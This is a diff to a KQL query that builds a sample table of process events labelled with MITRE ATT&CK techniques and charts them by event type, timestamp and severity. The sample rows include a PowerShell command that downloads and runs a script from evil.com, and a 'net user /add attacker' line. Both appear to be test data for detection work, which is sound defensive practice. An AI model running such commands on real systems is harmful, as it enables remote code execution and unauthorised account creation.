@@ -22,11 +22,7 @@ let process_events = datatable(UniqueID:int, Timestamp:datetime, DeviceID:string
 21,datetime("2023-01-22T06:51:28Z"),"Device021",1011,"cmd.exe /c ""echo malicious activity""","cmd.exe","C:\\Windows\\system32","T1059","Medium",true,
 22,datetime("2023-01-23T08:47:49Z"),"Device022",1012,"powershell.exe -ep bypass -c ""IEX (iwr 'https://evil.com/script.ps1')""","powershell.exe","C:\\Windows\\System32\\WindowsPowerShell\\v1.0","T1059","High",true,
 23,datetime("2023-01-24T12:39:11Z"),"Device023",1013,"net user /add attacker","net.exe","C:\\Windows\\system32","T1136","Medium",true,
-
-
-
-
 ];
 process_events
-| summarize count() by bin(Timestamp, 7d, Severity, EventType
+| summarize count() by EventType, Timestamp, Severity
 | render timechart
